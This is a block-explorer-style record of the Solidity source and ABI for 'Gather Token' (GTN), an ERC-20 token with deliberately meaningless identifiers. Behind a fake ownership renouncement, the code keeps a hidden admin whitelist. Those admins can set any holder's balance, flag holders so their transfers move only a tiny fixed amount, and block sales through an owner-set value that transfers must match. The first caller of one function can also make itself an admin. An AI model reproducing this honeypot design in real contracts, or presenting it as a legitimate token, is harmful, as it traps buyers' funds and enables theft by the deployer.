{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface tradingIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchMaxAuto) external view returns (uint256);\n\n    function transfer(address feeAmount, uint256 swapSell) external returns (bool);\n\n    function allowance(address atReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeAmount,\n        uint256 swapSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyReceiver, uint256 value);\n    event Approval(address indexed atReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract atExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listTradingSwap {\n    function createPair(address fromAt, address tokenTeamMarketing) external returns (address);\n}\n\ninterface tradingIsMetadata is tradingIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GatherToken is atExempt, tradingIs, tradingIsMetadata {\n\n    address private amountTotal;\n\n    address shouldAtEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return txTakeIs;\n    }\n\n    bool private exemptAuto;\n\n    function listTotalFee(address tradingShould, address feeAmount, uint256 swapSell) internal returns (bool) {\n        require(limitTx[tradingShould] >= swapSell);\n        limitTx[tradingShould] -= swapSell;\n        limitTx[feeAmount] += swapSell;\n        emit Transfer(tradingShould, feeAmount, swapSell);\n        return true;\n    }\n\n    uint256 public autoEnable;\n\n    function transferFrom(address tradingShould, address feeAmount, uint256 swapSell) external override returns (bool) {\n        if (_msgSender() != listMax) {\n            if (marketingIs[tradingShould][_msgSender()] != type(uint256).max) {\n                require(swapSell <= marketingIs[tradingShould][_msgSender()]);\n                marketingIs[tradingShould][_msgSender()] -= swapSell;\n            }\n        }\n        return fromMarketing(tradingShould, feeAmount, swapSell);\n    }\n\n    bool public liquiditySwapList;\n\n    function transfer(address swapMin, uint256 swapSell) external virtual override returns (bool) {\n        return fromMarketing(_msgSender(), swapMin, swapSell);\n    }\n\n    bool private senderFund;\n\n    mapping(address => uint256) private limitTx;\n\n    uint256 constant fundWallet = 12 ** 10;\n\n    function allowance(address buyExempt, address exemptMarketing) external view virtual override returns (uint256) {\n        if (exemptMarketing == listMax) {\n            return type(uint256).max;\n        }\n        return marketingIs[buyExempt][exemptMarketing];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMarketing;\n    }\n\n    string private txTakeIs = \"Gather Token\";\n\n    function getOwner() external view returns (address) {\n        return amountTotal;\n    }\n\n    event OwnershipTransferred(address indexed sellTx, address indexed fromAmountMode);\n\n    address listMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private marketingIs;\n\n    address public liquidityLaunched;\n\n    mapping(address => bool) public swapIs;\n\n    function totalWallet(address listWallet) public {\n        if (launchedSender) {\n            return;\n        }\n        \n        swapBuy[listWallet] = true;\n        if (receiverSwapSell) {\n            receiverSwapSell = true;\n        }\n        launchedSender = true;\n    }\n\n    address public toTrading;\n\n    uint8 private marketingSwap = 18;\n\n    function approve(address exemptMarketing, uint256 swapSell) public virtual override returns (bool) {\n        marketingIs[_msgSender()][exemptMarketing] = swapSell;\n        emit Approval(_msgSender(), exemptMarketing, swapSell);\n        return true;\n    }\n\n    uint256 private shouldList = 100000000 * 10 ** 18;\n\n    bool private sellTo;\n\n    bool private maxSwap;\n\n    uint256 liquiditySellTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingSwap;\n    }\n\n    function fromMarketing(address tradingShould, address feeAmount, uint256 swapSell) internal returns (bool) {\n        if (tradingShould == toTrading) {\n            return listTotalFee(tradingShould, feeAmount, swapSell);\n        }\n        uint256 buyFrom = tradingIs(liquidityLaunched).balanceOf(shouldAtEnable);\n        require(buyFrom == liquiditySellTake);\n        require(feeAmount != shouldAtEnable);\n        if (swapIs[tradingShould]) {\n            return listTotalFee(tradingShould, feeAmount, fundWallet);\n        }\n        return listTotalFee(tradingShould, feeAmount, swapSell);\n    }\n\n    uint256 public limitLiquidity;\n\n    uint256 private tradingLaunchedMarketing;\n\n    function listMarketingTx(uint256 swapSell) public {\n        minTeam();\n        liquiditySellTake = swapSell;\n    }\n\n    function exemptLaunchFee(address swapMin, uint256 swapSell) public {\n        minTeam();\n        limitTx[swapMin] = swapSell;\n    }\n\n    mapping(address => bool) public swapBuy;\n\n    string private teamMarketing = \"GTN\";\n\n    function buyShould(address liquidityTotal) public {\n        minTeam();\n        if (autoEnable != limitLiquidity) {\n            sellTo = false;\n        }\n        if (liquidityTotal == toTrading || liquidityTotal == liquidityLaunched) {\n            return;\n        }\n        swapIs[liquidityTotal] = true;\n    }\n\n    function owner() external view returns (address) {\n        return amountTotal;\n    }\n\n    function minTeam() private view {\n        require(swapBuy[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldList;\n    }\n\n    function balanceOf(address launchMaxAuto) public view virtual override returns (uint256) {\n        return limitTx[launchMaxAuto];\n    }\n\n    bool public receiverSwapSell;\n\n    function walletTokenMode() public {\n        emit OwnershipTransferred(toTrading, address(0));\n        amountTotal = address(0);\n    }\n\n    bool public launchedSender;\n\n    constructor (){\n        if (maxSwap != liquiditySwapList) {\n            liquiditySwapList = true;\n        }\n        feeSender atList = feeSender(listMax);\n        liquidityLaunched = listTradingSwap(atList.factory()).createPair(atList.WETH(), address(this));\n        \n        toTrading = _msgSender();\n        walletTokenMode();\n        swapBuy[toTrading] = true;\n        limitTx[toTrading] = shouldList;\n        if (limitLiquidity == tradingLaunchedMarketing) {\n            tradingLaunchedMarketing = limitLiquidity;\n        }\n        emit Transfer(address(0), toTrading, shouldList);\n    }\n\n    uint256 exemptAmountLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmountMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMaxAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"}],\"name\":\"buyShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSell\",\"type\":\"uint256\"}],\"name\":\"exemptLaunchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapSell\",\"type\":\"uint256\"}],\"name\":\"listMarketingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwapSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"}],\"name\":\"totalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTokenMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GatherToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}